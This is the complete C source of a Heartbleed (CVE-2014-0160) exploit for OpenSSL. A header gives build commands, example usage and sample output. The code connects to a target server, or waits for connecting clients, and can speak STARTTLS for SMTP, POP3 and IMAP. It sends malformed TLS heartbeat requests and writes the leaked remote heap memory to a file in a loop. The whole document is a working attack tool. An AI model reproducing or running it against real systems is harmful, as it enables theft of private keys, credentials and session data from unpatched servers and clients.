/*
* CVE-2014-0160 heartbleed OpenSSL information leak exploit
* =========================================================
* This exploit uses OpenSSL to create an encrypted connection
* and trigger the heartbleed leak. The leaked information is
* returned within encrypted SSL packets and is then decrypted
* and wrote to a file to annoy IDS/forensics. The exploit can
* set heartbeat payload length arbitrarily or use two preset
* values for NULL and MAX length. The vulnerability occurs due
* to bounds checking not being performed on a heap value which
* is user supplied and returned to the user as part of DTLS/TLS
* heartbeat SSL extension. All versions of OpenSSL 1.0.1 to
* 1.0.1f are known affected. You must run this against a target
* which is linked to a vulnerable OpenSSL library using DTLS/TLS.
* This exploit leaks upto 65535 bytes of remote heap each request
* and can be run in a loop until the connected peer ends connection.
* The data leaked contains 16 bytes of random padding at the end.
* The exploit can be used against a connecting client or server,
* it can also send pre_cmd's to plain-text services to establish
* an SSL session such as with STARTTLS on SMTP/IMAP/POP3. Clients
* will often forcefully close the connection during large leak
* requests so try to lower your payload request size.
*
* Compiled on ArchLinux x86_64 gcc 4.8.2 20140206 w/OpenSSL 1.0.1g
*
* E.g.
* $ gcc -lssl -lssl3 -lcrypto heartbleed.c -o heartbleed
* $ ./heartbleed -s 192.168.11.23 -p 443 -f out -t 1
* [ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit
* [ =============================================================
* [ connecting to 192.168.11.23 443/tcp
* [ connected to 192.168.11.23 443/tcp
* [ <3 <3 <3 heart bleed <3 <3 <3
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ heartbleed leaked length=65535
* [ final record type=24, length=16384
* [ wrote 16381 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=16408
* [ decrypting SSL packet
* [ final record type=24, length=16384
* [ wrote 16384 bytes of heap to file 'out'
* [ heartbeat returned type=24 length=42
* [ decrypting SSL packet
* [ final record type=24, length=18
* [ wrote 18 bytes of heap to file 'out'
* [ done.
* $ ls -al out
* -rwx------ 1 fantastic fantastic 65554 Apr 11 13:53 out
* $ hexdump -C out
* - snip - snip
*
* Use following example command to generate certificates for clients.
*
* $ openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
* -keyout server.key -out server.crt
*
* Debian compile with "gcc heartbleed.c -o heartbleed -Wl,-Bstatic \
* -lssl -Wl,-Bdynamic -lssl3 -lcrypto"
*
* todo: add udp/dtls support.
*
* - Hacker Fantastic
*   http://www.mdsec.co.uk
*
*/
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <inttypes.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/tls1.h>
#include <openssl/rand.h>
#include <openssl/buffer.h>

#define n2s(c,s)((s=(((unsigned int)(c[0]))<< 8)| \
		(((unsigned int)(c[1]))    )),c+=2)
#define s2n(s,c) ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
		 c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

int first = 0;
int leakbytes = 0;
int repeat = 1;
int badpackets = 0;

typedef struct {
	int socket;
	SSL *sslHandle;
	SSL_CTX *sslContext;
} connection;

typedef struct {
  unsigned char type;
  short version;
  unsigned int length;
  unsigned char hbtype;
  unsigned int payload_length;
  void* payload;
} heartbeat;

void ssl_init();
void usage();
int tcp_connect(char*,int);
int tcp_bind(char*, int);
connection* tls_connect(int);
connection* tls_bind(int);
int pre_cmd(int,int,int);
void* heartbleed(connection* ,unsigned int);
void* sneakyleaky(connection* ,char*, int);

int tcp_connect(char* server,int port){
	int sd,ret;
	struct hostent *host;
        struct sockaddr_in sa;
        host = gethostbyname(server);
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd==-1){
		printf("[!] cannot create socket\n");
		exit(0);
	}
	sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr = *((struct in_addr *) host->h_addr);
        bzero(&(sa.sin_zero),8);
	printf("[ connecting to %s %d/tcp\n",server,port);
        ret = connect(sd,(struct sockaddr *)&sa, sizeof(struct sockaddr));
	if(ret==0){
		printf("[ connected to %s %d/tcp\n",server,port);
	}
	else{
		printf("[!] FATAL: could not connect to %s %d/tcp\n",server,port);
		exit(0);
	}
	return sd;
}

int tcp_bind(char* server, int port){
	int sd, ret, val=1;
	struct sockaddr_in sin;
	struct hostent *host;
	host = gethostbyname(server);
	sd=socket(AF_INET,SOCK_STREAM,0);
	if(sd==-1){
    		printf("[!] cannot create socket\n");
		exit(0);
	}
	memset(&sin,0,sizeof(sin));
	sin.sin_addr=*((struct in_addr *) host->h_addr);
	sin.sin_family=AF_INET;
	sin.sin_port=htons(port);
    	setsockopt(sd,SOL_SOCKET,SO_REUSEADDR,&val,sizeof(val));
	ret = bind(sd,(struct sockaddr *)&sin,sizeof(sin));
	if(ret==-1){
		printf("[!] cannot bind socket\n");
		exit(0);
	}
	listen(sd,5);
	return(sd);
}


void ssl_init(){
        SSL_load_error_strings();
        SSL_library_init();
        OpenSSL_add_all_digests();
        OpenSSL_add_all_algorithms();
        OpenSSL_add_all_ciphers();
}

connection* tls_connect(int sd){
        connection *c;
	c = malloc(sizeof(connection));
        if(c==NULL){
		printf("[ error in malloc()\n");
		exit(0);
	}
	c->socket = sd;
        c->sslHandle = NULL;
        c->sslContext = NULL;
        c->sslContext = SSL_CTX_new(SSLv23_client_method());
	SSL_CTX_set_options(c->sslContext, SSL_OP_ALL | SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
        if(c->sslContext==NULL)
                ERR_print_errors_fp(stderr);
        c->sslHandle = SSL_new(c->sslContext);
        if(c->sslHandle==NULL)
                ERR_print_errors_fp(stderr);
        if(!SSL_set_fd(c->sslHandle,c->socket))
                ERR_print_errors_fp(stderr);
        if(SSL_connect(c->sslHandle)!=1)
                ERR_print_errors_fp(stderr);
        if(!c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
                c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS){
                printf("[ warning: heartbeat extension is unsupported (try anyway)\n");
        }
	return c;
}

connection* tls_bind(int sd){
	int bytes;
        connection *c;
        char* buf;
	buf = malloc(4096);
        if(buf==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	memset(buf,0,4096);
	c = malloc(sizeof(connection));
	if(c==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	c->socket = sd;
        c->sslHandle = NULL;
        c->sslContext = NULL;
        c->sslContext = SSL_CTX_new(SSLv23_server_method());
        if(c->sslContext==NULL)
                ERR_print_errors_fp(stderr);
	SSL_CTX_set_options(c->sslContext, SSL_OP_ALL | SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
	SSL_CTX_SRP_CTX_init(c->sslContext);
	SSL_CTX_use_certificate_file(c->sslContext, "./server.crt", SSL_FILETYPE_PEM);
	SSL_CTX_use_PrivateKey_file(c->sslContext, "./server.key", SSL_FILETYPE_PEM);
	if(!SSL_CTX_check_private_key(c->sslContext)){
		printf("[!] FATAL: private key does not match the certificate public key\n");
		exit(0);
	}
	c->sslHandle = SSL_new(c->sslContext);
        if(c->sslHandle==NULL)
                ERR_print_errors_fp(stderr);
        if(!SSL_set_fd(c->sslHandle,c->socket))
                ERR_print_errors_fp(stderr);
        int rc = SSL_accept(c->sslHandle);
	printf ("[ SSL connection using %s\n", SSL_get_cipher (c->sslHandle));
	bytes = SSL_read(c->sslHandle, buf, 4095);
	printf("[ recieved: %d bytes - showing output\n%s\n[\n",bytes,buf);
	if(!c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
                c->sslHandle->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS){
                printf("[ warning: heartbeat extension is unsupported (try anyway)\n");
        }
        return c;
}

int pre_cmd(int sd,int precmd,int verbose){
	/* this function can be used to send commands to a plain-text
	service or client before heartbleed exploit attempt. e.g. STARTTLS */
	int rc, go = 0;
	char* buffer;
	char* line1;
	char* line2;
	switch(precmd){
		case 0:
			line1 = "EHLO test\n";
			line2 = "STARTTLS\n";
			break;
		case 1:
			line1 = "CAPA\n";
			line2 = "STLS\n";
			break;
		case 2:
			line1 = "a001 CAPB\n";
			line2 = "a002 STARTTLS\n";
			break;
		default:
			go = 1;
			break;
	}
	if(go==0){
		buffer = malloc(2049);
	        if(buffer==NULL){
                	printf("[ error in malloc()\n");
                	exit(0);
	        }
		memset(buffer,0,2049);
		rc = read(sd,buffer,2048);
		printf("[ banner: %s",buffer);
		send(sd,line1,strlen(line1),0);
		memset(buffer,0,2049);
		rc = read(sd,buffer,2048);
		if(verbose==1){
			printf("%s\n",buffer);
		}
		send(sd,line2,strlen(line2),0);
		memset(buffer,0,2049);
		rc = read(sd,buffer,2048);
		if(verbose==1){
			printf("%s\n",buffer);
		}
	}
	return sd;
}

void* heartbleed(connection *c,unsigned int type){
	unsigned char *buf, *p;
        int ret;
	buf = OPENSSL_malloc(1 + 2);
	if(buf==NULL){
                printf("[ error in malloc()\n");
                exit(0);
        }
	p = buf;
        *p++ = TLS1_HB_REQUEST;
	switch(type){
		case 0:
			s2n(0x0,p);
			break;
		case 1:
			s2n(0xffff,p);
			break;
		default:
			printf("[ setting heartbeat payload_length to %u\n",type);
			s2n(type,p);
			break;
	}
	printf("[ <3 <3 <3 heart bleed <3 <3 <3\n");
        ret = ssl3_write_bytes(c->sslHandle, TLS1_RT_HEARTBEAT, buf, 3);
        OPENSSL_free(buf);
	return c;
}

void* sneakyleaky(connection *c,char* filename, int verbose){
	char *p;
        int ssl_major,ssl_minor,al;
        int enc_err,n,i;
        SSL3_RECORD *rr;
        SSL_SESSION *sess;
	SSL* s;
        unsigned char md[EVP_MAX_MD_SIZE];
        short version;
        unsigned mac_size, orig_len;
        size_t extra;
        rr= &(c->sslHandle->s3->rrec);
        sess=c->sslHandle->session;
        s = c->sslHandle;
        if (c->sslHandle->options & SSL_OP_MICROSOFT_BIG_SSLV3_BUFFER)
                extra=SSL3_RT_MAX_EXTRA;
        else
                extra=0;
        if ((s->rstate != SSL_ST_READ_BODY) ||
                (s->packet_length < SSL3_RT_HEADER_LENGTH)) {
                        n=ssl3_read_n(s, SSL3_RT_HEADER_LENGTH, s->s3->rbuf.len, 0);
                        if (n <= 0)
                                goto apple;
                        s->rstate=SSL_ST_READ_BODY;
                        p=s->packet;
                        rr->type= *(p++);
                        ssl_major= *(p++);
                        ssl_minor= *(p++);
                        version=(ssl_major<<8)|ssl_minor;
                        n2s(p,rr->length);
			if(rr->type==24){
				printf("[ heartbeat returned type=%d length=%u\n",rr->type, rr->length);
				if(rr->length > 16834){
					printf("[ error: got a malformed TLS length.\n");
					exit(0);
				}
			}
			else{
				printf("[ incorrect record type=%d length=%u returned\n",rr->type,rr->length);
				s->packet_length=0;
				badpackets++;
				if(badpackets > 3){
					printf("[ error: too many bad packets recieved\n");
					exit(0);
				}
				goto apple;
			}
        }
        if (rr->length > s->packet_length-SSL3_RT_HEADER_LENGTH){
                i=rr->length;
                n=ssl3_read_n(s,i,i,1);
                if (n <= 0) goto apple;
        }
	printf("[ decrypting SSL packet\n");
        s->rstate=SSL_ST_READ_HEADER;
        rr->input= &(s->packet[SSL3_RT_HEADER_LENGTH]);
        rr->data=rr->input;
        tls1_enc(s,0);
        if((sess != NULL) &&
            (s->enc_read_ctx != NULL) &&
            (EVP_MD_CTX_md(s->read_hash) != NULL))
                {
                unsigned char *mac = NULL;
                unsigned char mac_tmp[EVP_MAX_MD_SIZE];
                mac_size=EVP_MD_CTX_size(s->read_hash);
                OPENSSL_assert(mac_size <= EVP_MAX_MD_SIZE);
                orig_len = rr->length+((unsigned int)rr->type>>8);
                if(orig_len < mac_size ||
                  (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE &&
                   orig_len < mac_size+1)){
                        al=SSL_AD_DECODE_ERROR;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_LENGTH_TOO_SHORT);
                }
                if (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE){
                        mac = mac_tmp;
                        ssl3_cbc_copy_mac(mac_tmp, rr, mac_size, orig_len);
                        rr->length -= mac_size;
                }
                else{
                        rr->length -= mac_size;
                        mac = &rr->data[rr->length];
                }
                i = tls1_mac(s,md,0);
                if (i < 0 || mac == NULL || CRYPTO_memcmp(md, mac, (size_t)mac_size) != 0)
                        enc_err = -1;
                if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+extra+mac_size)
                        enc_err = -1;
                }
        if(enc_err < 0){
                al=SSL_AD_BAD_RECORD_MAC;
                SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DECRYPTION_FAILED_OR_BAD_RECORD_MAC);
                goto apple;
        }
        if(s->expand != NULL){
                if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+extra) {
                        al=SSL_AD_RECORD_OVERFLOW;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_COMPRESSED_LENGTH_TOO_LONG);
                        goto apple;
                        }
                if (!ssl3_do_uncompress(s)) {
                        al=SSL_AD_DECOMPRESSION_FAILURE;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_BAD_DECOMPRESSION);
                        goto apple;
                        }
                }
        if (rr->length > SSL3_RT_MAX_PLAIN_LENGTH+extra) {
                al=SSL_AD_RECORD_OVERFLOW;
                SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DATA_LENGTH_TOO_LONG);
                goto apple;
        }
        rr->off=0;
        s->packet_length=0;
	if(first==0){
		uint heartbleed_len = 0;
		char* fp = s->s3->rrec.data;
		(long)fp++;
		memcpy(&heartbleed_len,fp,2);
		heartbleed_len = (heartbleed_len & 0xff) << 8 | (heartbleed_len & 0xff00) >> 8;
		first = 2;
		leakbytes = heartbleed_len + 16;
		printf("[ heartbleed leaked length=%u\n",heartbleed_len);
	}
	if(verbose==1){
		{ unsigned int z; for (z=0; z<rr->length; z++) printf("%02X%c",rr->data[z],((z+1)%16)?' ':'\n'); }
                printf("\n");
        }
	leakbytes-=rr->length;
	if(leakbytes > 0){
		repeat = 1;
	}
	else{
		repeat = 0;
	}
	printf("[ final record type=%d, length=%u\n", rr->type, rr->length);
	int output = s->s3->rrec.length-3;
	if(output > 0){
		int fd = open(filename,O_RDWR|O_CREAT|O_APPEND,0700);
	        if(first==2){
			first--;
			write(fd,s->s3->rrec.data+3,s->s3->rrec.length);
			/* first three bytes are resp+len */
			printf("[ wrote %d bytes of heap to file '%s'\n",s->s3->rrec.length-3,filename);
		}
		else{
			/* heap data & 16 bytes padding */
			write(fd,s->s3->rrec.data+3,s->s3->rrec.length);
			printf("[ wrote %d bytes of heap to file '%s'\n",s->s3->rrec.length,filename);
		}
		close(fd);
	}
	else{
		printf("[ nothing from the heap to write\n");
	}
	return;
apple:
        printf("[ problem handling SSL record packet - wrong type?\n");
	badpackets++;
	if(badpackets > 3){
		printf("[ error: too many bad packets recieved\n");
		exit(0);
	}
	return;
}

void usage(){
	printf("[\n");
	printf("[ --server|-s <ip/dns>    - the server to target\n");
	printf("[ --port|-p   <port>      - the port to target\n");
	printf("[ --file|-f   <filename>  - file to write data to\n");
	printf("[ --bind|-b   <ip>        - bind to ip for exploiting clients\n");
	printf("[ --precmd|-c <n>         - send precmd buffer (STARTTLS)\n");
	printf("[			    0 = SMTP\n");
	printf("[			    1 = POP3\n");
	printf("[			    2 = IMAP\n");
	printf("[ --loop|-l		  - loop the exploit attempts\n");
	printf("[ --type|-t   <n>         - select exploit to try\n");
	printf("[                           0 = null length\n");
	printf("[			    1 = max leak\n");
	printf("[			    n = heartbeat payload_length\n");
	printf("[\n");
	printf("[ --verbose|-v            - output leak to screen\n");
	printf("[ --help|-h               - this output\n");
	printf("[\n");
	exit(0);
}

int main(int argc, char* argv[]){
	int ret, port, userc, index;
	int type = 1, udp = 0, verbose = 0, bind = 0, precmd = 9;
	int loop = 0;
	struct hostent *h;
	connection* c;
	char *host, *file;
	int ihost = 0, iport = 0, ifile = 0, itype = 0, iprecmd = 0;
	printf("[ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit\n");
	printf("[ =============================================================\n");
        static struct option options[] = {
        	{"server", 1, 0, 's'},
	        {"port", 1, 0, 'p'},
		{"file", 1, 0, 'f'},
		{"type", 1, 0, 't'},
		{"bind", 1, 0, 'b'},
		{"verbose", 0, 0, 'v'},
		{"precmd", 1, 0, 'c'},
		{"loop", 0, 0, 'l'},
		{"help", 0, 0,'h'}
        };
	while(userc != -1) {
	        userc = getopt_long(argc,argv,"s:p:f:t:b:c:lvh",options,&index);
        	switch(userc) {
               		case -1:
	                        break;
        	        case 's':
				if(ihost==0){
					ihost = 1;
					h = gethostbyname(optarg);
					if(h==NULL){
						printf("[!] FATAL: unknown host '%s'\n",optarg);
						exit(1);
					}
					host = malloc(strlen(optarg) + 1);
					if(host==NULL){
                				printf("[ error in malloc()\n");
				                exit(0);
        				}
					sprintf(host,"%s",optarg);
               			}
				break;
	                case 'p':
				if(iport==0){
					port = atoi(optarg);
					iport = 1;
				}
                	        break;
			case 'f':
				if(ifile==0){
					file = malloc(strlen(optarg) + 1);
					if(file==NULL){
				                printf("[ error in malloc()\n");
                				exit(0);
        				}
					sprintf(file,"%s",optarg);
					ifile = 1;
				}
				break;
			case 't':
				if(itype==0){
					type = atoi(optarg);
					itype = 1;
				}
				break;
			case 'h':
				usage();
				break;
			case 'b':
				if(ihost==0){
					ihost = 1;
					host = malloc(strlen(optarg)+1);
					if(host==NULL){
			 	                printf("[ error in malloc()\n");
				                exit(0);
				        }
					sprintf(host,"%s",optarg);
					bind = 1;
				}
				break;
			case 'c':
				if(iprecmd == 0){
					iprecmd = 1;
					precmd = atoi(optarg);
				}
				break;
			case 'v':
				verbose = 1;
				break;
			case 'l':
				loop = 1;
				break;
			default:
				break;
		}
	}
	if(ihost==0||iport==0||ifile==0||itype==0||type < 0){
		printf("[ try --help\n");
		exit(0);
	}
	ssl_init();
	if(bind==0){
		ret = tcp_connect(host, port);
		pre_cmd(ret, precmd, verbose);
		c = tls_connect(ret);
		heartbleed(c,type);
		while(repeat==1){
			sneakyleaky(c,file,verbose);
		}
		while(loop==1){
			printf("[ entered heartbleed loop\n");
			first=0;
			repeat=1;
			heartbleed(c,type);
			while(repeat==1){
				sneakyleaky(c,file,verbose);
			}
		}
		printf("[ done.\n");
		exit(0);
	}
	else{
		int sd, pid, i;
		ret = tcp_bind(host, port);
		while(1){
      			sd=accept(ret,0,0);
			if(sd==-1){
				printf("[!] FATAL: problem with accept()\n");
				exit(0);
			}
			if(pid=fork()){
				close(sd);
			}
      			else{
				c = tls_bind(sd);
				pre_cmd(ret, precmd, verbose);
				heartbleed(c,type);
				while(repeat==1){
					sneakyleaky(c,file,verbose);
				}
				while(loop==1){
					printf("[ entered heartbleed loop\n");
					first=0;
					repeat=0;
					heartbleed(c,type);
					while(repeat==1){
						sneakyleaky(c,file,verbose);
					}
				}
				printf("[ done.\n");
				exit(0);
			}
		}
	}
}